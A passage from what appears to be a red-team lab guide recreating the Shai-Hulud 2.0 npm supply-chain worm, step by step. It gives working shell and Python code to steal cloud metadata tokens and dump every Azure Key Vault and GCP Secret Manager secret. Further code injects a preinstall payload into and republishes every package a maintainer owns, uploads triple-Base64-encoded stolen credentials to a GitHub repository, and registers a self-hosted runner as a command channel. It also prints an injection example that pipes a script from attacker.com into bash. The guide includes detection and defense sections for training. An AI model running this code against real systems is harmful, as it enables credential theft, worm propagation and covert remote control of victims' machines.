    "https://${VAULT_NAME}.vault.azure.net/secrets/${secret}?api-version=7.4" | \
    python3 -c "import sys,json; print(json.load(sys.stdin)['value'])"
  echo ""
done
```

**Expected output:** Three secret values: Cosmos DB connection string, SendGrid API key, storage account key.

```bash
# Step 12d: Check the seeded credentials and git history
echo ""
echo "--- Seeded credentials on Azure VM ---"
sudo cat /home/developer/.env
echo ""
echo "--- Git history secrets ---"
sudo -u developer git -C /home/developer/projects/internal-api show HEAD~1:config.py

# Done with Azure -- exit the VM
echo ""
echo "=== Azure credential theft complete. Exiting Azure VM. ==="
exit
```

#### What Just Happened

From inside the Azure VM, you:

1. **Queried Azure IMDS** with `curl -H "Metadata: true"` to get a Bearer token scoped to Key Vault
2. **Used the token** (either directly via REST API or via `az login --identity`) to authenticate to Key Vault
3. **Listed all secrets** in accessible Key Vaults using the Managed Identity's permissions
4. **Retrieved secret values** for each secret

The Azure Activity Log records all Key Vault operations. A defender would see `SecretGet` and `SecretList` events from the VM's Managed Identity principal ID.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Steal Application Access Token | **T1528** | Credential Access |
| Cloud Secrets Management Stores | **T1555.006** | Credential Access |

T1528 specifically describes adversaries stealing OAuth2 tokens from Azure Managed Identities via the metadata service.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Managed Identity token request from unusual process | **High** |
| **CDR** | Bulk Key Vault `SecretGet` operations | **Critical** |
| **CIEM** | Managed Identity has Get+List on all Key Vault secrets | **High** |
| **CSPM** | Key Vault allows public network access | **Medium** |

**What the SOC would see:** "Managed Identity `sh2-xxxx-vm` performed 3 `SecretGet` operations on Key Vault `sh2kvXXXX` in 8 seconds. This identity has not accessed Key Vault in the past 30 days. Alert: Possible credential theft from Azure VM."

#### Defense

1. **Use RBAC for Key Vault** instead of access policies (finer-grained, auditable)
2. **Restrict Key Vault to private endpoints** (disable public network access)
3. **Enable Key Vault diagnostic logging** to Log Analytics for real-time alerting
4. **Use User-Assigned Managed Identities** with minimal permissions
5. **Set up Conditional Access policies** that restrict token acquisition to expected applications

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: The worm used `DefaultAzureCredential` from the Azure SDK, which automatically tries Managed Identity when running on Azure VMs
- **OMIGOD (2021)**: Critical vulnerability in Azure's Open Management Infrastructure allowed unauthenticated RCE on Linux VMs, with access to Managed Identity tokens
- **BeyondTrust Restless Guests (2025)**: Guest users escalated to Global Admin via Managed Identities on VMs with AAD extensions

---

### Step 13: GCP Metadata Server Credential Theft (from Inside the GCE Instance)

#### Context (Attacker Mindset)

The final cloud. GCP's metadata server works similarly to AWS IMDS but uses a different URL (`metadata.google.internal`), a different mandatory header (`Metadata-Flavor: Google`), and returns standard OAuth2 tokens that work with all Google APIs.

#### Concept: GCP Metadata Server and Service Accounts

Every GCP Compute Engine instance can have a **Service Account** attached. The metadata server at `http://metadata.google.internal` (also reachable at `http://169.254.169.254`) provides:

- Instance identity and attributes
- Project metadata
- **Service account OAuth2 access tokens**

The mandatory header `Metadata-Flavor: Google` serves the same purpose as Azure's `Metadata: true` -- it prevents most SSRF attacks but does not prevent direct access from code on the VM.

GCP service account tokens are standard OAuth2 Bearer tokens that work with any Google API: Secret Manager, Cloud Storage, BigQuery, Compute Engine, IAM, etc. The **scopes** assigned to the VM at creation time limit which APIs the token can access.

#### Commands

```bash
echo "=== STEP 13: GCP Metadata Server Token Theft ==="

# SSH into the GCP instance using gcloud
gcloud compute ssh \
  $(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_instance_name) \
  --zone=$(terraform -chdir=$HOME/shai-hulud-lab/terraform output -raw gcp_instance_zone)
```

**Flag breakdown for `gcloud compute ssh`:**
- `compute ssh` -- SSH into a Compute Engine instance
- `<instance-name>` -- The VM to connect to
- `--zone` -- The zone where the instance runs (GCP requires this)

`gcloud compute ssh` handles SSH key management automatically -- it generates a key pair, uploads the public key to the VM via metadata, and connects.

**You are now inside the GCP Compute Engine instance.**

```bash
# ---- YOU ARE NOW ON THE GCE INSTANCE ----

echo "=== Running on $(hostname) ==="
echo ""

# Step 13a: Steal the service account token from the metadata server
echo "--- Requesting service account token ---"
TOKEN_RESPONSE=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")

echo "${TOKEN_RESPONSE}" | python3 -m json.tool
```

**Flag breakdown for the GCP metadata request:**
- `http://metadata.google.internal` -- GCP's metadata server hostname (resolves to `169.254.169.254`)
- `/computeMetadata/v1/instance/service-accounts/default/token` -- Path to the default SA's token
- `-H "Metadata-Flavor: Google"` -- **Mandatory header**. Returns 403 without it.

**Expected output:**
```json
{
    "access_token": "ya29.c.b0AX...",
    "expires_in": 3600,
    "token_type": "Bearer"
}
```

```bash
# Extract the token
ACCESS_TOKEN=$(echo "${TOKEN_RESPONSE}" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Step 13b: Get the service account email and project ID
echo ""
echo "--- Service account identity ---"
SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
echo "Service Account: ${SA_EMAIL}"

PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id")
echo "Project ID:      ${PROJECT_ID}"

# Step 13c: List secrets using the stolen token via REST API
echo ""
echo "--- Listing Secret Manager secrets ---"
curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for s in data.get('secrets', []):
    name = s['name'].split('/')[-1]
    print(f'  Secret: {name}')
"
```

**Flag breakdown for the Secret Manager REST API:**
- `https://secretmanager.googleapis.com/v1/` -- GCP Secret Manager API base URL
- `projects/${PROJECT_ID}/secrets` -- List all secrets in the project
- `-H "Authorization: Bearer ${ACCESS_TOKEN}"` -- Authenticate with the stolen token

```bash
# Step 13d: Exfiltrate each secret value
echo ""
echo "--- Exfiltrating secret values ---"
for secret_name in $(curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets" | \
  python3 -c "import sys,json; [print(s['name'].split('/')[-1]) for s in json.load(sys.stdin).get('secrets',[])]"); do

  echo ""
  echo "  >>> Stealing: ${secret_name}"

  # Access the latest version of the secret
  RESPONSE=$(curl -s -H "Authorization: Bearer ${ACCESS_TOKEN}" \
    "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${secret_name}/versions/latest:access")

  # Secret data is base64-encoded in the response
  echo "${RESPONSE}" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
payload = data.get('payload', {}).get('data', '')
if payload:
    decoded = base64.b64decode(payload).decode('utf-8')
    print(f'  Value: {decoded}')
else:
    print('  Error: Could not decode secret')
"
done
```

**Expected output:** Three secret values: BigQuery service key, Pub/Sub credentials, Firebase admin key.

```bash
# Step 13e: Check seeded credentials and git history
echo ""
echo "--- Seeded credentials on GCP VM ---"
cat /home/developer/.env
echo ""
sudo -u developer git -C /home/developer/projects/analytics-pipeline show HEAD~1:config.py

# Done with GCP -- exit the instance
echo ""
echo "=== GCP credential theft complete. Exiting GCE instance. ==="
exit
```

#### What Just Happened

From inside the GCP Compute Engine instance, you:

1. **Queried the metadata server** with `curl -H "Metadata-Flavor: Google"` to steal an OAuth2 token
2. **Identified the service account** email and the GCP project ID
3. **Listed all secrets** in the project via the Secret Manager REST API
4. **Retrieved secret values** by accessing the `latest` version of each secret
5. **Decoded the base64-encoded** secret payloads

GCP **Cloud Audit Logs** record all Secret Manager operations. A defender would see `google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion` events from the service account.

Note the key difference from AWS: GCP secrets are returned as **base64-encoded** data in a JSON wrapper, while AWS returns raw strings. The worm had to handle both formats.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Instance Metadata API | **T1552.005** | Credential Access |
| Cloud Secrets Management Stores | **T1555.006** | Credential Access |

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Burst of `AccessSecretVersion` calls from Compute Engine VM | **Critical** |
| **CDR** | Service account accessed secrets it has never accessed before | **High** |
| **CIEM** | Service account has project-level `secretAccessor` role | **High** |

**What the SOC would see:** "Service account `sh2-lab-sa@project.iam.gserviceaccount.com` performed 3 `AccessSecretVersion` operations on Secret Manager in 6 seconds. This is the first time this SA has accessed secrets. Alert: Possible credential theft from GCE instance."

#### Defense

1. **Use Workload Identity Federation** for external workloads (eliminates service account keys)
2. **Grant `secretAccessor`** at the individual secret level, not project level
3. **Enable VPC Service Controls** to create a security perimeter around Secret Manager
4. **Audit Cloud Audit Logs** for unusual `AccessSecretVersion` patterns
5. **Use Shielded VMs** with Secure Boot to prevent unauthorized code execution
6. **Set metadata server firewall rules** to restrict which processes can access metadata

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: The worm used GCP's Application Default Credentials (ADC) SDK, which falls through to the metadata server when running on GCE
- **Google Cloud functions SSRF**: Researchers demonstrated that Cloud Functions with SSRF vulnerabilities can access the metadata server to steal service account tokens (because hop limit is not configurable on serverless)
- **Rhino Security Labs GCP privilege escalation**: Research showing how service account tokens from metadata can be used to escalate privileges across GCP services

---

## PHASE 3: Worm Self-Propagation + Cascading Dependency Demonstration

### Step 14: Infect All Remaining npm Packages

#### Context (Attacker Mindset)

You have harvested credentials from all three clouds and the local filesystem. Now the worm does something that makes it a true worm rather than just malware: it uses the stolen npm token to **automatically discover and infect every other package** owned by the same maintainer.

In the real attack, the worm queried `GET /-/v1/search?text=maintainer:<username>&size=250` to enumerate up to 250 packages per victim, sorted by monthly downloads descending. It then ran the download-inject-bump-republish cycle for each package in parallel. At peak intensity, approximately 1,000 new exfiltration repositories appeared every 30 minutes, and 796 unique packages were compromised across 1,092 versions.

#### Concept: npm Registry API

The npm registry exposes a REST API for package management:

- **Search**: `GET /-/v1/search?text=<query>&size=<n>` -- Full-text search with optional `maintainer:` qualifier
- **Package metadata**: `GET /<package-name>` -- Returns all versions, maintainers, dist info
- **Tarball download**: `GET /<scope>/<name>/-/<name>-<version>.tgz` -- The actual package archive
- **Publish**: `PUT /<package-name>` -- Upload a new version (requires authentication)
- **Whoami**: `GET /-/whoami` -- Returns the username for the authenticated token

These APIs are the same whether you are talking to npmjs.com, Verdaccio, GitHub Packages, or any other npm-compatible registry. This is why the worm works identically against all of them.

#### Commands

```bash
echo "=== STEP 14: Worm Self-Propagation ==="
cd ~/shai-hulud-lab

# Step 14a: Enumerate all packages owned by the victim
echo "--- Discovering victim's packages ---"
PACKAGES=$(curl -s "http://localhost:4873/-/v1/search?text=novatech&size=100" | \
  jq -r '.objects[].package.name')

echo "Packages found:"
echo "${PACKAGES}" | sed 's/^/  /'
echo ""
echo "Total: $(echo "${PACKAGES}" | wc -l) packages"
echo ""

# Step 14b: Infect each package (except auth-helpers, which is already infected)
echo "--- Beginning infection cycle ---"

for pkg_name in $(echo "${PACKAGES}" | grep -v auth-helpers); do
  echo ""
  echo "===================================="
  echo "  Infecting: ${pkg_name}"
  echo "===================================="

  # Clean workspace
  rm -rf /tmp/infect-workspace
  mkdir -p /tmp/infect-workspace
  cd /tmp/infect-workspace

  # Download the current package tarball
  echo "  [1/5] Downloading from registry..."
  npm pack "${pkg_name}" --registry http://localhost:4873 2>/dev/null

  tarball=$(ls *.tgz 2>/dev/null | head -1)
  if [ -z "${tarball}" ]; then
    echo "  [-] Download failed, skipping"
    cd ~/shai-hulud-lab
    continue
  fi

  # Extract
  echo "  [2/5] Extracting tarball..."
  tar xzf "${tarball}"
  cd package

  # Inject payload files
  echo "  [3/5] Injecting payload..."
  cp ~/shai-hulud-lab/payload/setup_bun.js .
  cp ~/shai-hulud-lab/payload/bun_environment.js .

  # Modify package.json: add preinstall hook and bump version
  echo "  [4/5] Modifying package.json..."
  python3 -c "
import json
with open('package.json', 'r') as f:
    pkg = json.load(f)
pkg['scripts'] = pkg.get('scripts', {})
pkg['scripts']['preinstall'] = 'node setup_bun.js'
parts = pkg['version'].split('.')
parts[2] = str(int(parts[2]) + 1)
pkg['version'] = '.'.join(parts)
with open('package.json', 'w') as f:
    json.dump(pkg, f, indent=2)
print(f'         Version bumped to {pkg[\"version\"]}')
"

  # Republish
  echo "  [5/5] Publishing infected version..."
  npm publish --registry http://localhost:4873 2>/dev/null && \
    echo "  [+] SUCCESS: ${pkg_name} infected and republished" || \
    echo "  [-] FAILED: publish rejected"

  cd ~/shai-hulud-lab
done

rm -rf /tmp/infect-workspace
```

```bash
# Step 14c: Verify all packages are now infected
echo ""
echo "=== Infection Summary ==="
echo "--- All package versions on Verdaccio ---"
curl -s "http://localhost:4873/-/v1/search?text=novatech&size=100" | \
  jq -r '.objects[] | "  \(.package.name)@\(.package.version)"'

echo ""
echo "Every package now contains the malicious preinstall hook."
echo "In the real attack, 796 packages were infected in a 48-hour window."
```

**Expected output:** All five packages listed with bumped patch versions:
```
  @novatech/auth-helpers@2.4.2
  @novatech/db-connector@1.8.4
  @novatech/logger@3.1.1
  @novatech/config-loader@1.2.1
  @novatech/api-client@4.0.3
```

#### What Just Happened

You executed the exact self-propagation algorithm of Shai-Hulud 2.0:

1. **Discovery** -- Queried the registry search API to find all packages by the victim maintainer
2. **Download** -- Fetched each package tarball with `npm pack`
3. **Injection** -- Copied `setup_bun.js` and `bun_environment.js` into the package
4. **Modification** -- Added the `preinstall` hook to `package.json` and bumped the patch version
5. **Republication** -- Published the infected version using the stolen token

Each newly infected package becomes a new propagation vector. If `@novatech/logger` is a dependency of some other company's package, and that company's developer runs `npm install`, the infection spreads to their machine too -- and if they have an npm token, the cycle repeats. This is true worm behavior: self-replicating, autonomous, exponential.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Supply Chain: Software Supply Chain | **T1195.002** | Initial Access |
| Trusted Developer Utilities Proxy Execution | **T1127** | Defense Evasion |

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **SCA** | Multiple packages updated with identical file additions | **Critical** |
| **ASPM** | Burst of package publications from a single token in short timeframe | **Critical** |
| **SCA** | New `preinstall` script added to packages that previously had none | **High** |

**What the SOC would see:** "npm token `npm_xxx` published 5 package updates in 30 seconds. All updates add identical `setup_bun.js` (SHA256: abc...) and `bun_environment.js` (SHA256: def...) files. All updates add a new `preinstall` lifecycle script. Alert: Automated supply chain compromise detected."

#### Defense

1. **Require OIDC-based trusted publishing** (no stored tokens -- packages are linked to specific CI/CD workflows)
2. **Enable npm provenance** on your packages (cryptographic proof of build origin)
3. **Monitor for bulk package updates** from a single token in a short window
4. **Use Socket.dev** or **Snyk** to detect suspicious file additions in dependency updates
5. **Rate-limit package publications** per token (npm now has this after Shai-Hulud 2.0)

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: 796 packages infected via this exact mechanism. The worm parallelized the infection cycle and processed up to 100 packages per victim.
- **Shai-Hulud v1 (September 2025)**: Same propagation mechanism but only targeted 20 packages per victim and used `postinstall` instead of `preinstall`

---

### Step 15: Cascading Dependency Demonstration

#### Context (Attacker Mindset)

The worm's true power comes from **transitive dependencies**. When a developer installs a meta-package that depends on infected sub-packages, the preinstall hook fires for EACH infected dependency in the tree. One `npm install` command can trigger the payload multiple times.

This step makes that exponential propagation tangible.

#### Concept: Transitive Dependencies

npm packages can depend on other packages, which depend on other packages, and so on. This creates a **dependency tree**:

```
@novatech/platform-sdk (not infected)
  +-- @novatech/auth-helpers@^2.4.0 (INFECTED)
  +-- @novatech/db-connector@^1.8.0 (INFECTED)
  +-- @novatech/logger@^3.1.0 (INFECTED)
```

When a developer runs `npm install @novatech/platform-sdk`, npm resolves and installs ALL dependencies. For each infected dependency, the `preinstall` hook fires. The payload runs **three times** from a single install command.

In the real Shai-Hulud 2.0 attack, some packages had deep dependency chains, meaning a single `npm install` could trigger the payload dozens of times through different paths in the tree.

#### Commands

```bash
echo "=== STEP 15: Cascading Dependency Demonstration ==="

# Step 15a: Create a meta-package that depends on 3 infected packages
mkdir -p ~/shai-hulud-lab/cascade-demo
cd ~/shai-hulud-lab/cascade-demo

mkdir -p novatech-platform-sdk
cat > novatech-platform-sdk/package.json << 'EOF'
{
  "name": "@novatech/platform-sdk",
  "version": "1.0.0",
  "description": "NovaTech Platform SDK - aggregates core libraries",
  "main": "index.js",
  "dependencies": {
    "@novatech/auth-helpers": "^2.4.0",
    "@novatech/db-connector": "^1.8.0",
    "@novatech/logger": "^3.1.0"
  }
}
EOF

cat > novatech-platform-sdk/index.js << 'EOF'
// Platform SDK - re-exports core NovaTech libraries
module.exports = {
  auth: require("@novatech/auth-helpers"),
  db: require("@novatech/db-connector"),
  logger: require("@novatech/logger")
};
EOF

# Publish the meta-package (this one is NOT infected itself)
cd novatech-platform-sdk
npm publish --registry http://localhost:4873 2>/dev/null
echo "Published @novatech/platform-sdk@1.0.0 (clean meta-package)"
cd ..

# Step 15b: Simulate a developer installing the meta-package
echo ""
echo "--- Simulating: npm install @novatech/platform-sdk ---"
echo ""
echo "Watch the preinstall hook fire for EACH infected transitive dependency."
echo "The payload will execute 3 times from this single install command."
echo ""

mkdir -p consumer-project
cd consumer-project

cat > package.json << 'EOF'
{
  "name": "novatech-internal-service",
  "version": "1.0.0",
  "dependencies": {
    "@novatech/platform-sdk": "^1.0.0"
  }
}
EOF

export WORM_EXFIL_DIR="${HOME}/.shai-hulud-cascade-demo"
export WORM_DRY_RUN="true"

# Install -- this triggers the payload 3 times
npm install --registry http://localhost:4873 2>&1

echo ""
echo "=== Cascading Result ==="
echo "The preinstall hook fired for each infected dependency:"
echo "  1. @novatech/auth-helpers (preinstall -> setup_bun.js)"
echo "  2. @novatech/db-connector (preinstall -> setup_bun.js)"
echo "  3. @novatech/logger (preinstall -> setup_bun.js)"
echo ""
echo "One npm install. Three payload executions."
echo "This is how 796 infected packages created exponential propagation."

cd ~/shai-hulud-lab
unset WORM_DRY_RUN
```

#### What Just Happened

1. You published a clean meta-package (`@novatech/platform-sdk`) that depends on three infected packages
2. When `npm install` resolved the dependency tree, it found:
   - `@novatech/auth-helpers@2.4.2` (infected)
   - `@novatech/db-connector@1.8.4` (infected)
   - `@novatech/logger@3.1.1` (infected)
3. npm executed the `preinstall` hook for **each** infected package before installation
4. The payload (credential harvester) ran **three times** from a single `npm install` command

In the real attack, dependency trees could be much deeper. A package with 50 transitive dependencies, 5 of which were infected, would trigger the payload 5 times. And each of those executions would attempt to steal npm tokens and propagate further.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Event Triggered Execution | **T1546** | Persistence, Privilege Escalation |
| Supply Chain Compromise | **T1195.002** | Initial Access |

#### Defense

1. **Use `npm audit` before deploying** to check for known compromised packages
2. **Lock dependency versions** with `package-lock.json` and use `npm ci` (fails on version mismatches)
3. **Minimize transitive dependencies** -- prefer packages with fewer dependencies
4. **Use `--ignore-scripts`** to prevent all lifecycle hooks during installation

---

## PHASE 4: GitHub Actions Persistence and Discussion-Based C2

### Step 16: Create the Exfiltration Repository and Upload Stolen Data

#### Context (Attacker Mindset)

You have harvested credentials from multiple clouds and multiple packages are infected. Now you establish persistence using GitHub infrastructure. The worm creates a repository under the victim's account, uploads the stolen data (triple-Base64-encoded), registers a self-hosted runner for persistent access, and creates a workflow that allows remote command execution via GitHub Discussions.

All traffic is legitimate GitHub HTTPS API calls, indistinguishable from normal developer activity.

#### Concept: Triple-Base64 Encoding

The real Shai-Hulud 2.0 worm encoded all exfiltrated data using **triple Base64**: `base64(base64(base64(data)))`. This is not encryption (it provides zero security), but it serves as **obfuscation** to evade automated content scanning. GitHub's secret scanning cannot detect known credential patterns in a triple-encoded blob because the patterns are not visible as plaintext.

#### Commands

```bash
echo "=== STEP 16: Exfiltration Repository + Data Upload ==="

# Step 16a: Create the exfiltration/C2 repository
C2_REPO="shai-hulud-c2-lab-$(date +%s)"

curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/user/repos \
  -d "{
    \"name\": \"${C2_REPO}\",
    \"description\": \"Sha1-Hulud: The Second Coming.\",
    \"private\": true,
    \"auto_init\": true,
    \"has_discussions\": true,
    \"has_issues\": false,
    \"has_projects\": false,
    \"has_wiki\": false
  }" | jq '{name: .name, html_url: .html_url, has_discussions: .has_discussions}'

echo "C2 repository created: https://github.com/${GITHUB_USERNAME}/${C2_REPO}"
echo "Description: 'Sha1-Hulud: The Second Coming.' (campaign marker)"
sleep 3
```

**What the repository description does:** The string `"Sha1-Hulud: The Second Coming."` is the **campaign marker**. In the real attack, the worm searched GitHub for repositories with this exact description to find and recycle credentials from other victims. It served dual purposes: identifying campaign infrastructure and enabling cross-victim credential sharing.

```bash
# Step 16b: Triple-Base64-encode and upload the exfiltrated data
echo ""
echo "--- Triple-Base64 encoding exfiltrated data ---"

# Use the local credentials file from Step 9
if [ -f ~/.shai-hulud-exfil/local_credentials.json ]; then
  # Triple encode: base64(base64(base64(data)))
  TRIPLE_ENCODED=$(cat ~/.shai-hulud-exfil/local_credentials.json | base64 -w0 | base64 -w0 | base64 -w0)

  echo "Original size:  $(wc -c < ~/.shai-hulud-exfil/local_credentials.json) bytes"
  echo "Encoded size:   ${#TRIPLE_ENCODED} characters"
  echo "Encoding ratio: ~$(( ${#TRIPLE_ENCODED} / $(wc -c < ~/.shai-hulud-exfil/local_credentials.json) ))x"
  echo ""

  # Upload to the repository as contents.json
  # The GitHub API requires the file content to be base64-encoded (one more layer!)
  # So the total is actually quadruple-encoded in transit
  curl -s -X PUT \
    -H "Authorization: token ${GITHUB_PAT}" \
    -H "Accept: application/vnd.github+json" \
    "https://api.github.com/repos/${GITHUB_USERNAME}/${C2_REPO}/contents/contents.json" \
    -d "{
      \"message\": \"update\",
      \"content\": \"$(echo "${TRIPLE_ENCODED}" | base64 -w0)\"
    }" | jq '{path: .content.path, sha: .content.sha, size: .content.size}'

  echo "Exfiltrated data uploaded to ${C2_REPO}/contents.json"
else
  echo "No exfiltrated data found. Run Step 9 first."
fi
```

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Exfiltration to Code Repository | **T1567.001** | Exfiltration |
| Data Obfuscation | **T1001** | Command and Control |

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | New repository created with known campaign marker description | **High** |
| **CDR** | Large base64-encoded file uploaded to repository | **Medium** |
| **ASPM** | Repository created by automation token, not interactive user | **Medium** |

---

### Step 17: Register a Real Self-Hosted GitHub Actions Runner

#### Concept: Self-Hosted Runners

GitHub Actions normally runs workflows on **GitHub-hosted runners** -- ephemeral VMs that are destroyed after each job. Organizations can also register **self-hosted runners** -- machines they control that pick up and execute workflow jobs.

The Shai-Hulud 2.0 worm registered the victim's machine as a self-hosted runner for the exfiltration repository, then deployed a workflow triggered by GitHub Discussions. When the attacker posted a Discussion, the workflow ran on the victim's machine -- giving the attacker persistent remote code execution through legitimate GitHub infrastructure.

The runner registration process:
1. Request a **registration token** from the GitHub API (valid for 1 hour)
2. Download the runner binary
3. Run `./config.sh --url <repo_url> --token <token> --name <name> --unattended`
4. Start the runner with `./run.sh`

#### Commands

```bash
echo "=== STEP 17: Self-Hosted Runner Registration ==="

# Step 17a: Request a runner registration token
echo "--- Requesting registration token ---"
REG_TOKEN=$(curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${C2_REPO}/actions/runners/registration-token" | \
  jq -r '.token')

echo "Registration token: ${REG_TOKEN:0:10}... (expires in 1 hour)"
```

**What the registration token is:** A short-lived token (1 hour TTL) that authorizes a single runner registration. It is NOT the same as the PAT -- it is specifically scoped to runner management. The worm used the stolen GitHub PAT to request this token via the API.

```bash
# Step 17b: Download and install the GitHub Actions runner
echo ""
echo "--- Downloading GitHub Actions runner ---"
RUNNER_DIR="${HOME}/.shai-hulud-runner"
mkdir -p "${RUNNER_DIR}"
cd "${RUNNER_DIR}"

# Determine architecture
ARCH=$(uname -m)
if [ "${ARCH}" = "x86_64" ]; then ARCH="x64"; fi
if [ "${ARCH}" = "aarch64" ]; then ARCH="arm64"; fi
OS=$(uname -s | tr '[:upper:]' '[:lower:]')

# Download the runner (using a recent stable version)
RUNNER_VERSION="2.332.0"
RUNNER_URL="https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-${OS}-${ARCH}-${RUNNER_VERSION}.tar.gz"

echo "Downloading from: ${RUNNER_URL}"
curl -sL -o actions-runner.tar.gz "${RUNNER_URL}"

echo "Extracting..."
tar xzf actions-runner.tar.gz
rm actions-runner.tar.gz

echo "Runner files installed to ${RUNNER_DIR}"
ls -la run.sh config.sh
```

```bash
# Step 17c: Configure the runner as "SHA1HULUD"
echo ""
echo "--- Configuring runner ---"

# RUNNER_ALLOW_RUNASROOT is needed if running as root (common in containers/labs)
# The real worm set this to bypass the root check
RUNNER_ALLOW_RUNASROOT=1 ./config.sh \
  --url "https://github.com/${GITHUB_USERNAME}/${C2_REPO}" \
  --token "${REG_TOKEN}" \
  --name "SHA1HULUD" \
  --unattended \
  --replace 2>/dev/null
```

**Flag breakdown for `config.sh`:**
- `--url` -- The repository URL this runner is registered to
- `--token` -- The registration token from Step 17a
- `--name "SHA1HULUD"` -- The runner name (the exact name used by the real worm)
- `--unattended` -- No interactive prompts (required for automated installation)
- `--replace` -- Replace any existing runner with the same name

```bash
# Step 17d: Start the runner
# Wait for GitHub broker to sync the runner registration
echo "Waiting 15 seconds for GitHub broker sync..."
sleep 15

RUNNER_ALLOW_RUNASROOT=1 nohup ./run.sh > nohup.out 2>&1 &
RUNNER_PID=$!
sleep 5

echo "Runner PID: ${RUNNER_PID}"
echo ""
echo "The runner is now connected to GitHub and waiting for workflow jobs."
echo "Verify at: https://github.com/${GITHUB_USERNAME}/${C2_REPO}/settings/actions/runners"
echo ""
echo "You should see a runner named 'SHA1HULUD' with status 'Idle'."
```

### Step 18: Create the Discussion-Based C2 Workflow

#### Concept: Expression Injection in GitHub Actions

GitHub Actions workflows can reference event data using `${{ }}` expressions. When an expression like `${{ github.event.discussion.body }}` appears inside a `run:` step, the value is **interpolated into the shell command BEFORE execution**. This means the Discussion body becomes part of the shell command.

**Vulnerable pattern:**
```yaml
run: echo ${{ github.event.discussion.body }}
```

If the Discussion body contains: `""; curl http://attacker.com/shell.sh | bash #`

The shell sees: `echo ""; curl http://attacker.com/shell.sh | bash #`

This achieves arbitrary command execution on the runner.

**Safe pattern (uses environment variable instead of direct interpolation):**
```yaml
run: echo "${DISC_BODY}"
env:
  DISC_BODY: ${{ github.event.discussion.body }}
```

#### Commands

```bash
echo "=== STEP 18: Discussion-Based C2 Workflow ==="

# Create the workflow file
# We create TWO versions: one showing the vulnerability (commented out)
# and one using the safe pattern (which still demonstrates the C2 concept)
WORKFLOW_CONTENT=$(base64 -w0 << 'WFEOF'
name: Discussion Handler
on:
  discussion:
    types: [created]

jobs:
  process-discussion:
    runs-on: self-hosted
    env:
      # Disable the runner's post-job cleanup so spawned processes persist
      # This is the real worm's technique for maintaining persistence
      RUNNER_TRACKING_ID: "0"
    steps:
      - uses: actions/checkout@v4

      - name: Process Discussion
        run: |
          echo "================================================"
          echo " C2 COMMAND RECEIVED VIA GITHUB DISCUSSION"
          echo "================================================"
          echo "Title: ${DISC_TITLE}"
          echo "Body:  ${DISC_BODY}"
          echo "Time:  $(date -u)"
          echo "Host:  $(hostname)"
          echo "User:  $(whoami)"
          echo "================================================"
          echo ""
          echo "In the REAL worm, the vulnerable version was:"
          echo '  run: echo ${{ github.event.discussion.body }}'
          echo "which allows arbitrary command injection."
          echo ""
          echo "This safe version uses environment variables instead."
        env:
          DISC_TITLE: ${{ github.event.discussion.title }}
          DISC_BODY: ${{ github.event.discussion.body }}
WFEOF
)

curl -s -X PUT \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${C2_REPO}/contents/.github/workflows/discussion.yml" \
  -d "{
    \"message\": \"Add discussion handler workflow\",
    \"content\": \"${WORKFLOW_CONTENT}\"
  }" | jq '{path: .content.path}'

echo "C2 workflow deployed"
echo ""
echo "=== TO TEST THE C2 CHANNEL ==="
echo ""
echo "1. Go to: https://github.com/${GITHUB_USERNAME}/${C2_REPO}/discussions/new?category=general"
echo "2. Create a Discussion with title: 'Test Command' and body: 'whoami && hostname'"
echo "3. Watch the Actions tab: https://github.com/${GITHUB_USERNAME}/${C2_REPO}/actions"
echo "4. The workflow will execute ON YOUR MACHINE (the self-hosted runner)"
echo "5. Check the workflow logs to see the Discussion body echoed"
echo ""
echo "In the real worm, the Discussion body would contain actual shell commands"
echo "that execute via expression injection on the victim's machine."
```

#### What Just Happened

You set up the complete Shai-Hulud 2.0 persistence mechanism:

1. **Created an exfiltration repository** with the campaign marker description `"Sha1-Hulud: The Second Coming."`
2. **Uploaded stolen credentials** (triple-Base64-encoded) as a file in the repo
3. **Registered a self-hosted runner** named `SHA1HULUD` on your machine
4. **Deployed a Discussion-triggered workflow** that runs on the self-hosted runner
5. The `RUNNER_TRACKING_ID: 0` environment variable disables post-job cleanup, allowing spawned processes to persist

The attacker now has persistent remote code execution on the victim's machine through legitimate GitHub infrastructure. All C2 traffic is HTTPS to `api.github.com` and `github.com`, using standard GitHub API calls that are indistinguishable from normal developer activity.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
